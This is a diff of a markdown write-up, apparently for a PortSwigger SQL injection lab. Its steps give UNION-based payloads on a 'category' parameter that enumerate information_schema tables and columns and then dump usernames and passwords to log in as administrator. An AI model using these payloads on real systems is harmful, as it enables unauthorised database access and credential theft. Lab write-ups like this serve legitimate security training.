@@ -15,32 +15,30 @@ The application has a login function, and the database contains a table that hol
 
 ## Exp
 1. Determine # of columns
-Payload: `?category=Gifts' union select NULL,NULL --`
+    
+    Payload: `?category=Gifts' union select NULL,NULL --`
 
 2. Determine which column contained text string
-Payload: `?category=Gifts' union select 'a','b' --`
+    
+    Payload: `?category=Gifts' union select 'a','b' --`
 
 3. According to [cheat sheet](https://portswigger.net/web-security/sql-injection/examining-the-database)
-We can use `information_schema.tables` to search `table_name`
-For instance: `SELECT * FROM information_schema.tables`
-![](https://i.imgur.com/ThON4MR.png)
+    
+    We can use `information_schema.tables` to search `table_name`
+    
+    For instance: `SELECT * FROM information_schema.tables`
+    ![](https://i.imgur.com/ThON4MR.png)
 
     Payload: `?category=Gifts' union SELECT TABLE_NAME,NULL FROM information_schema.tables--`
-    :::spoiler Result
     ![](https://i.imgur.com/DhL1g5i.png)
-    :::
 4. Then tried the specific one - `users_rjrgxf`
-Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_rjrgxf'--
-`
-    :::spoiler Result
+    
+    Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_rjrgxf'--`
     ![](https://i.imgur.com/egzZ49U.png)
-    :::
 5. Tried dig deeper
-    Payload: `?category=Gifts' union SELECT username_ngqqos,password_jraqsv FROM users_rjrgxf--
-    `
-    Then you'll get the password of `administrator` $\to$ login directrly
-    :::spoiler Success Screenshot
+    
+    Payload: `?category=Gifts' union SELECT username_ngqqos,password_jraqsv FROM users_rjrgxf--`
+    
+    Then you'll get the password of `administrator` → login directrly
+    
     ![](https://i.imgur.com/CKhLZdj.png)
-    :::
-
-## Reference
